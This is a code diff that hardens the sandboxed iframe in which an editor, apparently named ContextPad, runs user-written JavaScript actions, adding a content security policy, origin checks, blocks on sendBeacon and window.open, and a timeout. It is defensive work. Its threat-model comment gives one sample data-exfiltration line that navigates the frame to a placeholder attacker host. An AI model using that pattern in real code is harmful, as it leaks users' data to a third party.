@@ -1,92 +1,208 @@
-<!DOCTYPE html>
-<html>
+﻿<!DOCTYPE html>
+<!--
+  ContextPad action sandbox.
+
+  THREAT MODEL
+  ============
+  Executes user-authored action JavaScript inside a sandboxed iframe
+  (sandbox="allow-scripts", no allow-same-origin => opaque origin, no access
+  to the parent realm, app commands, or storage).
+
+  Blocked by construction:
+  - Network exfiltration: CSP `connect-src 'none'`, `img-src 'none'`,
+    `form-action 'none'`, plus sendBeacon/window.open overrides.
+  - Cross-origin message spoofing: origin pinned via ?origin= and validated
+    against event.origin AND event.source AND an opaque request id.
+  - Parent access: no allow-same-origin, no allow-top-navigation.
+
+  Residual risks (accepted, documented):
+  - The frame can navigate ITSELF (e.g. location = 'https://evil/?data=...').
+    Browsers offer no CSP directive to block self-navigation. Acceptable for
+    user-authored actions (self-harm only); review third-party action imports
+    before trusting them (actionStore sanitizes structure, not code).
+  - A tight synchronous loop cannot be preempted on the main thread; the
+    parent applies its own 5s deadline and drops the frame.
+  - `Function` remains reachable via (function(){}).constructor in the same
+    realm; any code executed that way is still subject to this CSP.
+-->
+<html lang="en">
 <head>
-    <meta charset="utf-8">
-    <title>Sandbox</title>
+  <meta charset="utf-8">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'none'; img-src 'none'; media-src 'none'; connect-src 'none'; font-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
+  <title>ContextPad Sandbox</title>
 </head>
 <body>
 <script>
-    // Listen for messages from the parent window
-    window.addEventListener('message', async (event) => {
-        // Simple origin check - only allow parent frame
-        if (event.source !== window.parent) return
+(function () {
+  'use strict';
 
-        const { id, code, context } = event.data
-        if (!id || !code) return
+  // The parent pins the expected origin via the URL; every incoming message
+  // must match it exactly. This guards against cross-origin spoofing.
+  var ALLOWED_ORIGIN = new URL(document.location.href).searchParams.get('origin');
+  if (!ALLOWED_ORIGIN) {
+    try { window.parent.postMessage({ type: 'sandbox-error', error: 'Missing origin' }, '*'); } catch (e) {}
+    return;
+  }
 
-        try {
-            // Reconstruct the helpers object with simple message passing for actions
-            const helpers = {
-                getSelection: () => context.selection,
-                getAllText: () => context.allText,
-                getLine: (n) => {
-                    const lines = context.allText.split('\n');
-                    if (n < 1 || n > lines.length) return '';
-                    return lines[n - 1];
-                },
-                getLines: () => context.allText.split('\n'),
-                getCursorPosition: () => context.cursorPosition,
-                getCurrentLine: () => context.currentLineText,
-                getLineCount: () => context.lineCount,
-                
-                // Mutation functions send messages back that we queue
-                replaceSelection: (text) => queueMutation({ type: 'replaceSelection', text }),
-                insertAtCursor: (text) => queueMutation({ type: 'insertAtCursor', text }),
-                replaceAllText: (text) => queueMutation({ type: 'replaceAllText', text }),
-                setCursorPosition: (pos) => queueMutation({ type: 'setCursorPosition', pos }),
-                copyToClipboard: (text) => queueMutation({ type: 'copyToClipboard', text: String(text ?? '') }),
-                // Legacy aliases for older custom action code
-                toCopy: (text) => queueMutation({ type: 'copyToClipboard', text: String(text ?? '') }),
-                copy: (text) => queueMutation({ type: 'copyToClipboard', text: String(text ?? '') })
-            }
+  // Capture the constructors we still need BEFORE any user code runs. Deleting
+  // window.eval / window.Function is a no-op for built-ins in browsers, so
+  // references are captured and the globals are shadowed inside the executor
+  // scope instead.
+  var capturedFunction = Function;
+  var capturedSetTimeout = window.setTimeout.bind(window);
+  var capturedClearTimeout = window.clearTimeout.bind(window);
 
-            // Compatibility shim for legacy actions still calling navigator.clipboard.writeText(...)
-            const navigatorShim = {
-                clipboard: {
-                    writeText: (text) => {
-                        queueMutation({ type: 'copyToClipboard', text: String(text ?? '') })
-                        return Promise.resolve()
-                    }
-                }
-            }
-            
-            // Allow basic logging
-            const consoleInterceptor = {
-                log: (...args) => queueMutation({ type: 'log', args }),
-                error: (...args) => queueMutation({ type: 'error', args })
-            }
+  // Neutralize exfiltration channels that do not rely on the DOM. CSP also
+  // blocks connect-/img-based requests, these overrides are belt and braces.
+  try {
+    window.navigator.sendBeacon = function () {
+      console.warn('[Sandbox] sendBeacon blocked');
+      return false;
+    };
+  } catch (e) {}
+  try {
+    window.open = function () {
+      throw new Error('window.open is blocked in the sandbox');
+    };
+  } catch (e) {}
 
-            let mutations = []
-            function queueMutation(mutation) {
-                mutations.push(mutation)
-            }
+  function buildHelpers(context) {
+    var data = context || {};
+    return {
+      getSelection: function () { return String(data.selection || ''); },
+      getAllText: function () { return String(data.allText || ''); },
+      getCursorPosition: function () { return data.cursorPosition || { line: 0, ch: 0 }; },
+      getCurrentLine: function () { return String(data.currentLineText || ''); },
+      getLineCount: function () { return Number(data.lineCount || 0); },
+      getLine: function (n) {
+        var lines = String(data.allText || '').split('\n');
+        if (n < 1 || n > lines.length) return '';
+        return lines[n - 1];
+      },
+      getLines: function () { return String(data.allText || '').split('\n'); },
 
-            // Create sandboxed function
-            // We do NOT expose window, document, or global APIs easily here
-            const fn = new Function('helpers', 'console', 'navigator', `
-                "use strict";
-                try {
-                    ${code}
-                } catch(e) {
-                    throw e;
-                }
-            `)
+      // Mutation instructions are queued and replayed by the parent editor.
+      replaceSelection: function (text) { return { type: 'replaceSelection', text: String(text == null ? '' : text) }; },
+      insertAtCursor: function (text) { return { type: 'insertAtCursor', text: String(text == null ? '' : text) }; },
+      replaceAllText: function (text) { return { type: 'replaceAllText', text: String(text == null ? '' : text) }; },
+      setCursorPosition: function (pos) { return { type: 'setCursorPosition', pos: pos }; },
+      copyToClipboard: function (text) { return { type: 'copyToClipboard', text: String(text == null ? '' : text) }; },
 
-            // Execute the user's code
-            fn(helpers, consoleInterceptor, navigatorShim)
-            
-            // Return success with any pending mutations
-            event.source.postMessage({ id, success: true, mutations }, event.origin)
-            
-        } catch (error) {
-            // Return error
-            event.source.postMessage({ 
-                id, 
-                success: false, 
-                error: error instanceof Error ? error.message : String(error) 
-            }, event.origin)
+      // Legacy aliases for older action snippets.
+      toCopy: function (text) { return { type: 'copyToClipboard', text: String(text == null ? '' : text) }; },
+      copy: function (text) { return { type: 'copyToClipboard', text: String(text == null ? '' : text) }; }
+    };
+  }
+
+  window.addEventListener('message', function (event) {
+    // 1) Origin must be exactly the pinned parent origin.
+    if (typeof event.origin !== 'string' || event.origin !== ALLOWED_ORIGIN) {
+      console.warn('[Sandbox] Rejected message from origin: ' + event.origin);
+      return;
+    }
+    // 2) The sender must be the parent frame.
+    if (event.source !== window.parent) return;
+
+    var msg = event.data || {};
+    if (!msg.id || typeof msg.code !== 'string') {
+      try {
+        event.source.postMessage({ id: msg.id || null, success: false, error: 'Invalid message structure' }, ALLOWED_ORIGIN);
+      } catch (e) {}
+      return;
+    }
+
+    // 3) Deadline for non-blocking code. Infinite synchronous loops cannot be
+    //    preempted on the main thread; the parent also enforces its own timeout
+    //    and stops receiving the frame.
+    var timedOut = false;
+    var deadline = capturedSetTimeout(function () { timedOut = true; }, 5000);
+
+    try {
+      var helpers = buildHelpers(msg.context);
+      var mutations = [];
+
+      // Route helper calls through a Proxy so mutation instructions are
+      // collected deterministically as the user code executes them. The
+      // `set` trap prevents user code from replacing helper functions with
+      // its own objects (the helper surface is read-only by contract).
+      var proxied = new Proxy(helpers, {
+        get: function (target, prop) {
+          var value = target[prop];
+          if (typeof value === 'function') {
+            return function () {
+              if (timedOut) throw new Error('Execution timed out');
+              var result = value.apply(null, arguments);
+              if (result && typeof result === 'object' && result.type) {
+                mutations.push(result);
+              }
+              if (timedOut) throw new Error('Execution timed out');
+              return result;
+            };
+          }
+          return value;
+        },
+        set: function () {
+          throw new Error('helpers is read-only inside the sandbox');
         }
-    })
+      });
+
+      // Compatibility shim: legacy actions call navigator.clipboard.writeText.
+      // Routed through the mutation queue like every other side effect.
+      function buildNavigator() {
+        var clipboardShim = {
+          writeText: function (text) {
+            mutations.push({ type: 'copyToClipboard', text: String(text == null ? '' : text) });
+            return Promise.resolve();
+          }
+        };
+        try {
+          return Object.create(navigator, { clipboard: { value: clipboardShim, configurable: true } });
+        } catch (e) {
+          return { clipboard: clipboardShim };
+        }
+      }
+
+      var safeConsole = {
+        log: function () {},
+        info: function () {},
+        warn: function () {},
+        error: function () {}
+      };
+
+      var runner = capturedFunction('helpers', 'console', 'navigator', msg.code);
+      var returned = runner(proxied, safeConsole, buildNavigator());
+      capturedClearTimeout(deadline);
+
+      function replySuccess() {
+        try {
+          event.source.postMessage({ id: msg.id, success: true, mutations: mutations }, ALLOWED_ORIGIN);
+        } catch (e) {}
+      }
+
+      function replyError(err) {
+        capturedClearTimeout(deadline);
+        try {
+          event.source.postMessage({ id: msg.id, success: false, error: String((err && err.message) || err) }, ALLOWED_ORIGIN);
+        } catch (e) {}
+      }
+
+      if (returned && typeof returned.then === 'function') {
+        returned.then(replySuccess).catch(replyError);
+      } else {
+        replySuccess();
+      }
+    } catch (err) {
+      capturedClearTimeout(deadline);
+      try {
+        event.source.postMessage({ id: msg.id, success: false, error: String((err && err.message) || err) }, ALLOWED_ORIGIN);
+      } catch (e) {}
+    }
+  });
+
+  try {
+    window.parent.postMessage({ type: 'sandbox-ready' }, ALLOWED_ORIGIN);
+  } catch (e) {}
+})();
 </script>
 </body>
 </html>
